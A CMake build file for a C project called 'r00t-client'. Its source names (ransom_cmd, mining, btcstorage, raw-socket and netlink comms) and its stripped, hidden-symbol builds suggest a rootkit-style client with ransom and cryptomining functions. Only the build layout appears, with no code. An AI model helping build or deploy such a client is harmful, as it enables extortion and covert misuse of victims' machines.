cmake_minimum_required(VERSION 3.0.0 FATAL_ERROR)

project("r00t-client" VERSION 0.1.0 LANGUAGES C)
set(CMAKE_C_STANDARD 99)
set(CMAKE_C_STANDARD_REQUIRED ON)
set(CMAKE_C_FLAGS "-Werror=implicit-function-declaration")

list(APPEND CMAKE_MODULE_PATH "${CMAKE_SOURCE_DIR}/cmake")
find_package(NL REQUIRED)
find_package(GCrypt REQUIRED)

include_directories(${NL_INCLUDE_DIRS} ${GCRYPT_INCLUDE_DIRS})

set(SOURCES r00t-client.c
		btcstorage.c btcstorage.h
		mining.c mining.h
		debug.h
		ransom_cmd.c ransom_cmd.h
		raw_socket_comms.h)

add_executable(r00t-netlink-client netlink_comms.c ${SOURCES})
target_link_libraries(r00t-netlink-client ${NL_LIBRARIES} ${GCRYPT_LIBRARIES})

add_executable(r00t-test-client debugcomm.c ${SOURCES})
target_link_libraries(r00t-test-client ${GCRYPT_LIBRARIES})

add_executable(r00t-raw-client ${SOURCES} raw_socket_comms.c)
target_link_libraries(r00t-raw-client ${GCRYPT_LIBRARIES})
target_link_options(r00t-raw-client PRIVATE -O1 -pie -s)
target_compile_options(r00t-raw-client PRIVATE -O1 -fPIC -fvisibility=hidden)

add_executable(r00t-raw-client-docker ${SOURCES} raw_socket_comms.c)
target_link_libraries(r00t-raw-client-docker ${GCRYPT_LIBRARIES})
target_link_options(r00t-raw-client-docker PRIVATE -O1 -pie -s)
target_compile_options(r00t-raw-client-docker PRIVATE -O1 -fPIC -fvisibility=hidden)
target_compile_definitions(r00t-raw-client-docker PUBLIC IN_DOCKER)
